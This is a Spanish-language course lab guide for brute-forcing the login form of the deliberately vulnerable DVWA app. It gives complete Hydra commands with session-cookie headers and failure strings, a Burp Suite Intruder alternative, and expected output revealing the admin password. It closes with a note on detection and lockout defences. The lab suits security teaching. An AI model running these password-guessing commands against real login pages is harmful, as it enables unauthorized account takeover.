# LAB 07 — Brute Force (Fuerza Bruta sobre Autenticación)
**DVWA → Brute Force → Security Level: Low**

---

## ¿Qué pide el PDF exactamente?

> "Muestre los **comandos** y el proceso para ejecutar un ataque de fuerza bruta
> sobre la sección que presenta esta vulnerabilidad."

El foco está en los comandos de Hydra y el proceso completo, no solo el resultado.

---

## Antes de empezar — checklist

```
[ ] Kali con sesión: danielaguirre@kali:~$
[ ] rockyou.txt disponible — verificar: ls /usr/share/wordlists/rockyou.txt
[ ] Si no existe: sudo gunzip /usr/share/wordlists/rockyou.txt.gz
[ ] DVWA abierto y logueado (cualquier usuario sirve para tomar la cookie)
[ ] Security Level: LOW
[ ] Hydra instalado: hydra --version
```

---

## Razonamiento clave antes de ejecutar Hydra

### ¿Por qué el formulario usa GET y qué implica?

Ir a DVWA → Brute Force. Intenta hacer login con cualquier usuario/contraseña
incorrecta. Mira la URL resultante:
```
http://<IP>/dvwa/vulnerabilities/brute/?username=admin&password=test&Login=Login
```

Las credenciales van **en la URL** (método GET). Esto tiene dos implicaciones:
1. Las credenciales quedan en los logs del servidor web → evidencia forense
2. Herramientas como Hydra pueden automatizar el ataque simplemente repitiendo
   peticiones GET modificando los parámetros `username` y `password`

### El problema de la cookie — CRUCIAL

DVWA requiere que estés logueado para acceder a la sección Brute Force.
Si Hydra hace peticiones sin la cookie de sesión, el servidor lo redirige al
login en vez de mostrar el formulario de brute force.

**Debes incluir tu `PHPSESSID` en el comando de Hydra.**

### Cómo obtener tu PHPSESSID

**Opción A — F12 → Application:**
1. Abre Firefox con DVWA
2. F12 → Application (o Storage en Firefox) → Cookies → `http://<IP_VICTIMA>`
3. Copia el valor de `PHPSESSID`
   Ejemplo: `abc123def456ghi789`

**Opción B — F12 → Network:**
1. F12 → Network → haz click en cualquier petición a DVWA
2. Headers → Request Headers → Cookie: `PHPSESSID=abc123; security=low`

**Opción C — Barra de URL en Firefox:**
```
javascript:document.cookie
```
Pega esto en la barra de URL y presiona Enter → muestra todas las cookies.

---

## PARTE 1 — Analizar el formulario (sin Hydra aún)

### Paso 1 — Identificar exactamente los parámetros

Con F12 abierto en Firefox, ve a DVWA → Brute Force e intenta login fallido.
En la pestaña Network verás la petición GET con:
- **URL:** `/dvwa/vulnerabilities/brute/`
- **Parámetros:** `username=`, `password=`, `Login=Login`
- **Respuesta ante fallo:** contiene el texto `Username and/or password incorrect.`

Esta cadena de fallo es la que usará Hydra para saber que un intento fue incorrecto.

### Paso 2 — Confirmar mensaje de éxito vs fallo

Fallo → la página contiene: `Username and/or password incorrect.`
Éxito → la página contiene: `Welcome to the password protected area` (o similar)

Hydra usará la cadena de FALLO para descartar intentos incorrectos.

---

## PARTE 2 — Ataque con Hydra

### Paso 3 — Comando Hydra básico (con cookie)

```bash
danielaguirre@kali:~$ hydra \
  -l admin \
  -P /usr/share/wordlists/rockyou.txt \
  <IP_VICTIMA> \
  http-get-form \
  "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=<TU_PHPSESSID>; security=low:F=Username and/or password incorrect"
```

**Desglose parámetro por parámetro:**

```
-l admin
   → Usuario fijo a probar. El login de DVWA tiene usuario "admin".
   → Si quisieras probar múltiples usuarios usarías -L users.txt

-P /usr/share/wordlists/rockyou.txt
   → Lista de contraseñas. RockYou tiene ~14 millones de contraseñas reales.
   → La contraseña de DVWA ("password") está en las primeras líneas.

<IP_VICTIMA>
   → IP de Metasploitable, no de Kali.

http-get-form
   → Módulo de Hydra para formularios con método GET.
   → Si fuera POST usarías: http-post-form

La cadena de 4 partes separadas por ":" :
   Parte 1: /dvwa/vulnerabilities/brute/
            → Ruta del formulario (sin la IP, sin http://)

   Parte 2: username=^USER^&password=^PASS^&Login=Login
            → Parámetros del formulario.
            → ^USER^ y ^PASS^ son reemplazados por Hydra en cada intento.
            → Login=Login es el parámetro del botón submit — siempre fijo.

   Parte 3: H=Cookie\: PHPSESSID=<TU_PHPSESSID>; security=low
            → H= indica que es un header HTTP personalizado.
            → Incluye la cookie de sesión para que el servidor no redirija al login.
            → REEMPLAZA <TU_PHPSESSID> con el valor real que copiaste de F12.

   Parte 4: F=Username and/or password incorrect
            → F= indica la cadena de FALLO.
            → Cuando la respuesta contiene este texto, Hydra sabe que falló.
```

### Versión en una sola línea (para copiar-pegar):

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP_VICTIMA> http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=<TU_PHPSESSID>; security=low:F=Username and/or password incorrect"
```

### Paso 4 — Acelerar el ataque con múltiples tareas

Por defecto Hydra usa 16 tareas paralelas. Para ser más agresivo (en laboratorio):
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 32 <IP_VICTIMA> http-get-form \
  "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=<TU_PHPSESSID>; security=low:F=Username and/or password incorrect"
```
`-t 32` → 32 hilos paralelos. No uses más de 64 en DVWA, puede crashear.

### Paso 5 — Resultado esperado de Hydra

```
Hydra v9.x (c) 2023 by van Hauser/THC
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries
[DATA] attacking http-get-form://<IP_VICTIMA>:80//dvwa/...
[80][http-get-form] host: 192.168.56.101   login: admin   password: password
1 valid password found!
```

📸 **CAPTURA 1:** Terminal completa de Hydra con el comando ejecutado y el
resultado mostrando `login: admin  password: password`.

---

## PARTE 3 — Verificar las credenciales manualmente

### Paso 6 — Login manual con las credenciales encontradas

En Firefox, en el formulario de Brute Force de DVWA:
- Username: `admin`
- Password: `password`
- Click Submit

Resultado esperado:
```
Welcome to the password protected area admin
```

📸 **CAPTURA 2:** Página de DVWA mostrando el mensaje de bienvenida tras login
exitoso con las credenciales obtenidas por fuerza bruta.

---

## PARTE 4 — Alternativa con Burp Suite (Intruder)

Si Hydra da problemas, Burp Suite es la alternativa visual:

### Paso 7 — Configurar Burp Suite

1. Abrir Burp Suite en Kali: `burpsuite &`
2. Firefox → Preferences → Network Settings → Manual Proxy:
   - HTTP Proxy: `127.0.0.1` Port: `8080`
3. En Burp: Proxy → Intercept → Intercept is ON

### Paso 8 — Capturar la petición

En DVWA → Brute Force, escribe `admin` / `test` y click Submit.
Burp intercepta la petición. La ves así:
```
GET /dvwa/vulnerabilities/brute/?username=admin&password=test&Login=Login HTTP/1.1
Host: 192.168.56.101
Cookie: PHPSESSID=abc123; security=low
```

Click derecho en la petición → Send to Intruder.

### Paso 9 — Configurar Intruder

Intruder → Positions → Clear § → seleccionar el valor de `password` → Add §
```
username=admin&password=§test§&Login=Login
```

Intruder → Payloads → Simple List → Load → `/usr/share/wordlists/rockyou.txt`

Click Start Attack.

La petición que tenga una longitud de respuesta diferente a las demás es la
contraseña correcta.

---

## Troubleshooting

| Problema | Causa | Solución |
|---|---|---|
| Hydra no encuentra contraseña | Cookie incorrecta o expirada | Sacar nuevo PHPSESSID de F12 y reintentar |
| "Invalid URL" en Hydra | Error en la cadena de parámetros | Verificar que las 4 partes estén separadas por `:` |
| Hydra encuentra "password" en cada intento | Cadena de fallo incorrecta | Copiar exactamente: `Username and/or password incorrect` |
| rockyou.txt no existe | Está comprimido | `sudo gunzip /usr/share/wordlists/rockyou.txt.gz` |
| DVWA redirige al login durante el ataque | Sesión expirada | Loguear de nuevo en DVWA y actualizar el PHPSESSID |

---

## Capturas mínimas para el informe

| # | Contenido | Qué demuestra |
|---|---|---|
| 1 | Comando completo de Hydra y resultado con `login: admin password: password` | **Prueba principal** del ataque |
| 2 | Login exitoso en DVWA con `admin/password` | Validación de que las credenciales son correctas |
| (Opcional) 3 | F12 mostrando el PHPSESSID | Explicación de por qué la cookie es necesaria |

---

## Dato importante para el informe

Hydra le está haciendo **miles de peticiones HTTP por segundo** al servidor.
En un sistema real esto es detectable en los logs de Apache/Nginx. La defensa
mínima (bloqueo tras 5 intentos) haría este ataque imposible sin complicaciones
adicionales. Eso es exactamente lo que el docente quiere que analices.
